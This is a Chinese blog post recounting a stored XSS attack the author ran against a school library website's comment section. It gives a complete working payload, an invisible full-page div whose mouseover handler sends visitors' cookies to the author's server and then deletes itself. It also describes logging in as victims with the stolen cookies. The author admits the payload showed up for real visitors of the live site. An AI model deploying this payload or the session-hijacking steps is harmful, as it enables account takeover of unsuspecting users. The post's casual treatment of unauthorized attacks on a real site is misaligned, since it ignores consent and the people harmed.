---
title: XSS持久型攻击实例--向学校图书馆网站页面注入JS
date: 2016-04-16 00:28:27
tags:
- xss
- web
- javascript
-categories:
- javascript
---

XSS攻击是Web中很常见的攻击，其原理有点类似与SQL注入，改变了原来的执行逻辑。之前了解过一些XSS，但是没有去具体实现，刚刚拿学校的网站做了下XSS攻击，成功的给图书馆网站下了毒+_+...

XSS攻击大概可以分为两种，一种是非持久型攻击，这一般只会影响个体用户，不会造成长期的影响，另一种为持久型攻击，也就是我们要讲的这种，将我们的代码注入到目标服务器页面上，所有访问这个页面的用户都会被攻击。其实之前没有去具体实现因为比较“出名”的网站一般在防XSS上做的比较完善，不好去找漏洞，所以才拿学校网站做测试(以前经常这样干抓数据什么的。。。)，在最后我们实现的是向页面中注入自己的js代码，并将访问该页面用户的cookie信息传到我自己的服务器上。

# 找到漏洞
XSS一般会发生在提交表单或者其他与服务器交互的场景中，然而好像学校网站基本没有可以用户自己回复信息，发布信息什么的，但是记得好像学校图书馆的页面可以评论，就拿这个测试了。

![/images/lib-cqut-1.png](/images/lib-cqut-1.png)

<!--more-->

在这里我测试了几次，前端只是对内容长度进行了过滤，但是没有对内容进行正则匹配非法字符。一开始我直接上script，但是被后端程序处理掉了，看来还是有点点防范的。后面我又试了HTML标签，发现div没有被过滤，开始激动了。。。

# 编写注入程序
这里我们找到了js注入的入口，通过div标签来当跳板，但是如何将js放到里面执行呢？我想到的是通过事件，但是如何来触发事件？div没有onload事件，怎么让div一被加载就执行我们的脚本呢？我用一种比较巧妙的方法来实现了。

通过mouseover事件来触发我们的脚本，那么如何保证事件一定会被触发？我的做法是：
```css
position: absolute; //让插入的div脱离标准文档流
width: 100%; //占满屏幕
height: 100%;
background-color: blue; //给个颜色方便测试
z-index: 1000; //让div提升到最上层，但不能绝对保证
```
我设置了个绝对定位的div，大小为屏幕大小，z-index设置了出现在z轴上的位置，尽量大，基本上在页面上的最顶层了，这样mouseover事件99%会被触发(除非打开页面后你直接用ctrl+w关闭了页面，或者浏览器爆炸，关机)，下面是完整的css样式：
```css
position: absolute;
width: 100%;
height: 100%;
background-color: blue;
filter: alpha(opacity=0);
opacity: 0;
-moz-opacity: 0;
-webkit-opacity: 0;
-ms-opacity: 0;
z-index: 1000;
```
设置了透明度和背景只是为了本地的调试，没有什么用，但是之前测试的时候直接向页面提交了带有颜色的div导致打开那个页面的时候所有用户会出现了一个巨大的蓝色div。。。失误

好了最核心的部分来了，写XSS payload：
```javascript
(function xss() {
    var cookie = 'this is cookie ' + document.cookie,
        img = document.createElement('img'),
        el = document.getElementById('xss');

    img.src = 'http://127.0.0.1/index.php?cookie=' + cookie;
    document.getElementById('xss').parentNode.removeChild(el);

    console.log(cookie);
})();
```
这里是个立即执行函数，首先我们拿到了当前用户的cookie并创建了一个img节点，获得了当前我们插入的xss节点，给img节点设置了src，一旦设置了src后这里就会去请求这个地址。这里我们比较巧妙的使用了GET请求来发送数据，一般情况GET是用来获取数据的，但是我们将用户的cookie当成queryString的值发给了我们本地的服务器。这里只是做了测试，实际中的攻击是用真实的服务器。这样我们服务器接受到请求后，就可以查看服务器的访问日志，里面就会包含具体的GET请求，带了用户cookie。

![/images/lib-cqut-2.png](/images/lib-cqut-2.png)

当时测试时直接用的alert输出，所以在网站的某个页面上，用户访问时会直接弹出一个我插入的alert，包含了当前用户的cookie。。。。失误

最后为了隐蔽我将插入到DOM tree的节点进行了删除，这样又恢复到了正常的状态，但是cookie已经被我们拿走了，通过DIV XSS攻击的完整实现如下：
```javascript
<div id="xss" style="position: absolute;
		width: 100%;
		height: 100%;
		background-color: blue;
		filter: alpha(opacity=0);
		opacity: 0;
		-moz-opacity: 0;
		-webkit-opacity: 0;
		-ms-opacity: 0;
		z-index: 1000;" onmouseover="(function xss() {
			var cookie = 'this is cookie ' + document.cookie,
				img = document.createElement('img'),
				el = document.getElementById('xss');

			img.src = 'http://127.0.0.1/index.php?cookie=' + cookie;
			document.getElementById('xss').parentNode.removeChild(el);

			console.log(cookie);
		})()">
</div>
```
这样我们只要把这段代码回复上去，以后所有访问这个页面的用户就会把自己的cookie发到我们的服务器，下面是实际测试。

# 测试
回复上面的代码，再次访问的时候，控制台悄无声息的输出了当前登陆账户的cookie

![/images/lib-cqut-3.png](/images/lib-cqut-3.png)

那么此时，我们本地服务器也应该会有结果了，看一下

![/images/lib-cqut-4.png](/images/lib-cqut-4.png)

在服务器的访问日志上我们可以清楚的看到刚才访问这个页面的用户的时间，页面所有cookie值，UA信息，那么拿到用户的cookie后有什么用？

# 伪造登陆
cookie是用户的登陆凭据，那么我们拿到用户的cookie后就可以直接登陆啦。我们可以以访客的身份浏览这个页面，然后设置当前页面的cookie值，这里可以用浏览器插件实现，chrome下比如说可以用EditThisCookie插件，免费开源一直在用，挺不错的。然后我们把获取到的cookie填入

![/images/lib-cqut-5.png](/images/lib-cqut-5.png)

这样再次刷新页面，发现我们登陆了。。。。

# 感触
细思恐极，这样一旦XSS攻击成功用户的数据就完全暴露了，这里只是获取了一个cookie，我们完全可以操作DOM搞个登陆框，中奖信息出来，关键是，这个页面还是从你访问的安全站点弹出来的，就算有点安全意识的人也可能防不胜防。最后上面我只是在内网上进行了测试，并没有恶意XSS攻击学校网站，不要查水表。。。
